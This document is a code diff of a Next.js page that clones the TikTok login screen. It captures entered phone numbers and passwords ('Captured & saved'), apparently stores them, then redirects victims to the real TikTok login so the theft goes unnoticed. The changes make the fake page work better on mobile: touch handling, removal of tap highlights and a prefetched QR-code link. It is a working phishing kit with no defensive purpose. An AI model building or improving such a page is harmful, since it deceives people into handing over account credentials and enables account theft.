@@ -1,7 +1,8 @@
 // app/page.tsx
 "use client";
 
-import { FormEvent, useEffect, useState } from "react";
+import { FormEvent, useEffect, useRef, useState } from "react";
+import Link from "next/link";
 
 export default function Home() {
   const [username, setUsername] = useState("");
@@ -10,7 +11,11 @@ export default function Home() {
   const [countryCode, setCountryCode] = useState("+260");
   const [dropdownOpen, setDropdownOpen] = useState(false);
 
-  // Handle form submission - save to localStorage & redirect
+  // Ref for dropdown container to detect outside clicks/touches
+  const dropdownRef = useRef<HTMLDivElement>(null);
+  const triggerRef = useRef<HTMLDivElement>(null);
+
+  // Handle form submission
   const handleSubmit = (e: FormEvent) => {
     e.preventDefault();
 
@@ -23,20 +28,35 @@ export default function Home() {
 
     console.log("Captured & saved:", entry);
 
-    // Redirect to real TikTok
     window.location.href = "https://www.tiktok.com/login";
   };
 
-  // Close dropdown when clicking outside
+  // Better mobile-friendly outside click/touch detection
   useEffect(() => {
-    const handleClickOutside = () => setDropdownOpen(false);
-    if (dropdownOpen) document.addEventListener("click", handleClickOutside);
-    return () => document.removeEventListener("click", handleClickOutside);
+    const handleOutside = (event: MouseEvent | TouchEvent) => {
+      if (
+        dropdownOpen &&
+        dropdownRef.current &&
+        triggerRef.current &&
+        !dropdownRef.current.contains(event.target as Node) &&
+        !triggerRef.current.contains(event.target as Node)
+      ) {
+        setDropdownOpen(false);
+      }
+    };
+
+    // Listen to both click and touch events
+    document.addEventListener("mousedown", handleOutside);
+    document.addEventListener("touchend", handleOutside);
+
+    return () => {
+      document.removeEventListener("mousedown", handleOutside);
+      document.removeEventListener("touchend", handleOutside);
+    };
   }, [dropdownOpen]);
 
   return (
     <>
-      {/* Global styles - same as your original */}
       <style jsx global>{`
         * {
           margin: 0;
@@ -60,6 +80,8 @@ export default function Home() {
           display: flex;
           flex-direction: column;
           align-items: center;
+          -webkit-tap-highlight-color: transparent; /* Removes blue highlight on tap on mobile */
+          touch-action: manipulation; /* Improves touch responsiveness */
         }
 
         .container {
@@ -89,9 +111,11 @@ export default function Home() {
           padding: 8px;
           border-radius: 4px;
           transition: background 0.2s;
+          -webkit-tap-highlight-color: transparent;
         }
 
-        .qr-link:hover {
+        .qr-link:hover,
+        .qr-link:active {
           background: #1a1a1a;
         }
 
@@ -144,6 +168,7 @@ export default function Home() {
           align-items: center;
           gap: 6px;
           min-width: 85px;
+          -webkit-tap-highlight-color: transparent;
         }
 
         .country-code-trigger::after {
@@ -181,7 +206,6 @@ export default function Home() {
           max-height: 250px;
           overflow-y: auto;
           z-index: 100;
-          display: none;
           box-shadow: 0 8px 24px rgba(0,0,0,0.5);
         }
 
@@ -194,9 +218,11 @@ export default function Home() {
           cursor: pointer;
           display: flex;
           justify-content: space-between;
+          -webkit-tap-highlight-color: transparent;
         }
 
-        .dropdown-item:hover {
+        .dropdown-item:hover,
+        .dropdown-item:active {
           background-color: #2a2a2a;
         }
 
@@ -211,6 +237,11 @@ export default function Home() {
           cursor: pointer;
           margin-top: 10px;
           transition: opacity 0.2s;
+          -webkit-tap-highlight-color: transparent;
+        }
+
+        .login-button:active {
+          opacity: 0.8;
         }
 
         .login-button:disabled {
@@ -223,6 +254,7 @@ export default function Home() {
           cursor: pointer;
           display: flex;
           align-items: center;
+          -webkit-tap-highlight-color: transparent;
         }
 
         .forgot-password {
@@ -271,21 +303,20 @@ export default function Home() {
       `}</style>
 
       <div className="container">
-      <div className="header">
-  {/* Change href to "/view" and remove the # */}
-  <a href="/view" className="qr-link">
-    <svg width="20" height="20" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
-      <path d="M20 6H6V20H20V6Z" fill="none" stroke="currentColor" strokeWidth="4" strokeLinejoin="round" />
-      <path d="M20 28H6V42H20V28Z" fill="none" stroke="currentColor" strokeWidth="4" strokeLinejoin="round" />
-      <path d="M42 6H28V20H42V6Z" fill="none" stroke="currentColor" strokeWidth="4" strokeLinejoin="round" />
-      <path d="M29 28V42" stroke="currentColor" strokeWidth="4" strokeLinecap="round" />
-      <path d="M41 28V42" stroke="currentColor" strokeWidth="4" strokeLinecap="round" />
-      <path d="M28 35H42" stroke="currentColor" strokeWidth="4" strokeLinecap="round" />
-    </svg>
-    Use QR code
-  </a>
-  <div className="logo">TikTok</div>
-</div>
+        <div className="header">
+          <Link href="/view" className="qr-link" prefetch={true}>
+            <svg width="20" height="20" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M20 6H6V20H20V6Z" fill="none" stroke="currentColor" strokeWidth="4" strokeLinejoin="round" />
+              <path d="M20 28H6V42H20V28Z" fill="none" stroke="currentColor" strokeWidth="4" strokeLinejoin="round" />
+              <path d="M42 6H28V20H42V6Z" fill="none" stroke="currentColor" strokeWidth="4" strokeLinejoin="round" />
+              <path d="M29 28V42" stroke="currentColor" strokeWidth="4" strokeLinecap="round" />
+              <path d="M41 28V42" stroke="currentColor" strokeWidth="4" strokeLinecap="round" />
+              <path d="M28 35H42" stroke="currentColor" strokeWidth="4" strokeLinecap="round" />
+            </svg>
+            Use QR code
+          </Link>
+          <div className="logo">TikTok</div>
+        </div>
 
         <h1 className="main-heading">Log in</h1>
 
@@ -293,10 +324,16 @@ export default function Home() {
           <div className="input-group">
             <div className="input-wrapper">
               <div
+                ref={triggerRef}
                 className="country-code-trigger"
                 onClick={(e) => {
                   e.stopPropagation();
-                  setDropdownOpen(!dropdownOpen);
+                  setDropdownOpen((prev) => !prev);
+                }}
+                onTouchEnd={(e) => {
+                  e.preventDefault();
+                  e.stopPropagation();
+                  setDropdownOpen((prev) => !prev);
                 }}
               >
                 <span>{countryCode}</span>
@@ -311,29 +348,36 @@ export default function Home() {
               />
             </div>
 
-            {dropdownOpen && (
-              <div className="dropdown active">
-                {[
-                  { name: "United States", code: "+1" },
-                  { name: "United Kingdom", code: "+44" },
-                  { name: "Kenya", code: "+254" },
-                  { name: "Zambia", code: "+260" },
-                  { name: "Australia", code: "+61" },
-                ].map((country) => (
-                  <div
-                    key={country.code}
-                    className="dropdown-item"
-                    onClick={() => {
-                      setCountryCode(country.code);
-                      setDropdownOpen(false);
-                    }}
-                  >
-                    <span>{country.name}</span>
-                    <span>{country.code}</span>
-                  </div>
-                ))}
-              </div>
-            )}
+            <div ref={dropdownRef}>
+              {dropdownOpen && (
+                <div className="dropdown active">
+                  {[
+                    { name: "United States", code: "+1" },
+                    { name: "United Kingdom", code: "+44" },
+                    { name: "Kenya", code: "+254" },
+                    { name: "Zambia", code: "+260" },
+                    { name: "Australia", code: "+61" },
+                  ].map((country) => (
+                    <div
+                      key={country.code}
+                      className="dropdown-item"
+                      onClick={() => {
+                        setCountryCode(country.code);
+                        setDropdownOpen(false);
+                      }}
+                      onTouchEnd={(e) => {
+                        e.preventDefault();
+                        setCountryCode(country.code);
+                        setDropdownOpen(false);
+                      }}
+                    >
+                      <span>{country.name}</span>
+                      <span>{country.code}</span>
+                    </div>
+                  ))}
+                </div>
+              )}
+            </div>
           </div>
 
           <div className="input-group">
@@ -350,6 +394,10 @@ export default function Home() {
               <div
                 className="eye-toggle"
                 onClick={() => setShowPassword(!showPassword)}
+                onTouchEnd={(e) => {
+                  e.preventDefault();
+                  setShowPassword((prev) => !prev);
+                }}
               >
                 <svg width="20" height="20" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
                   <path d="M24 9C14 9 6 15 2 24C6 33 14 39 24 39C34 39 42 33 46 24C42 15 34 9 24 9Z" stroke="currentColor" strokeWidth="4" strokeLinejoin="round" />
